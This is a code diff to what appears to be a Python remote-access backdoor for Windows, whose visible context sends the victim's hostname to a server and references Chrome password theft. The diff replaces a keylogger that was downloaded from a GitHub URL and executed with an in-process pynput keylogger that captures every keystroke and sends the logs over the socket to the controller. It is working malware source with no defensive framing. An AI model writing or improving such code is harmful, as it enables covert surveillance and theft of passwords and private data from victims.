@@ -1,6 +1,5 @@
-import socket, os, sys, platform, time, ctypes, subprocess, webbrowser, sqlite3, pyscreeze
+import socket, os, sys, platform, time, ctypes, subprocess, webbrowser, sqlite3, pyscreeze, threading, pynput.keyboard
 import win32console, win32gui, win32api, winerror, win32event, win32crypt
-import urllib.request
 from shutil import copyfile
 from winreg import *
 
@@ -46,6 +45,31 @@ objSocket.send(str.encode(socket.gethostname()))  # send computer name to server
 
 # function to return decoded utf-8
 decode_utf8 = lambda data: data.decode("utf-8")
+
+
+def OnKeyboardEvent(event):
+    global strKeyLogs
+
+    try:  # check to see if variable is defined
+        strKeyLogs
+    except NameError:
+        strKeyLogs = ""
+
+    if event == Key.backspace:
+        strKeyLogs += " [Bck] "
+    elif event == Key.tab:
+        strKeyLogs += " [Tab] "
+    elif event == Key.enter:
+        strKeyLogs += "\n"
+    elif event == Key.space:
+        strKeyLogs += " "
+    elif type(event) == Key:  # if the character is some other type of special key
+        strKeyLogs += " [" + str(event)[4:] + "] "
+    else:
+        strKeyLogs += str(event)[1:len(str(event)) - 1]  # remove quotes around character
+
+KeyListener = pynput.keyboard.Listener(on_press=OnKeyboardEvent)
+Key = pynput.keyboard.Key
 
 
 def recvall(buffer):  # function to receive large amounts of data
@@ -277,48 +301,36 @@ def chrpass():  # legal purposes only!
 
 
 def keylogger(option):
-    if option == "start":
-        if not os.path.isfile(TMP + "/spbkhost.exe"):
-            try:
-                urllib.request.urlretrieve("https://github.com/xp4xbox/Python-Backdoor/blob/master/bin/keylogger?raw=true", TMP + "/spbkhost.exe")
-            except:  # if the file cannot be downloaded
-                objSocket.send(str.encode("error"))
-                return
+    global strKeyLogs
 
-        subprocess.Popen(TMP + "/spbkhost.exe", shell=True)  # start the keylogger
-        objSocket.send(str.encode("success"))
+    if option == "start":
+        if not KeyListener.running:
+            KeyListener.start()
+            objSocket.send(str.encode("success"))
+        else:
+            objSocket.send(str.encode("error"))
 
     elif option == "stop":
-        # give the signal to stop
-        objSettings = open(TMP + "/spbky.txt", "w")
-        objSettings.write("stop")
-        objSettings.close()
+        if KeyListener.running:
+            KeyListener.stop()
+            threading.Thread.__init__(KeyListener)  # re-initialise the thread
+            objSocket.send(str.encode("success"))
+        else:
+            objSocket.send(str.encode("error"))
 
     elif option == "dump":
-
-        objSettings = open(TMP + "/spbky.txt", "w")
-        objSettings.write("dump")  # give signal to dump
-        objSettings.close()
-
-        time.sleep(2)
-
-        if not os.path.isfile(TMP + "/spblog.txt"):
+        if not KeyListener.running:
             objSocket.send(str.encode("error"))
-            return
+        else:
+            if strKeyLogs == "":
+                objSocket.send(str.encode("error2"))
+            else:
+                time.sleep(0.2)
+                objSocket.send(str.encode(str(len(strKeyLogs))))  # send buffer size
+                time.sleep(0.2)
+                objSocket.send(str.encode(strKeyLogs))  # send logs
 
-        objTxtFile = open(TMP + "/spblog.txt", "r")  # read logs
-        strLogs = objTxtFile.read()
-        objTxtFile.close()
-        open(TMP + "/spblog.txt", "w").close()  # clear log contents
-
-        if strLogs == "":
-            objSocket.send(str.encode("error"))
-            return
-
-        time.sleep(0.2)
-        objSocket.send(str.encode(str(len(strLogs))))  # send buffer size
-        time.sleep(0.2)
-        objSocket.send(str.encode(strLogs))  # send logs
+                strKeyLogs = ""  # clear logs
 
 
 def run_command(command):
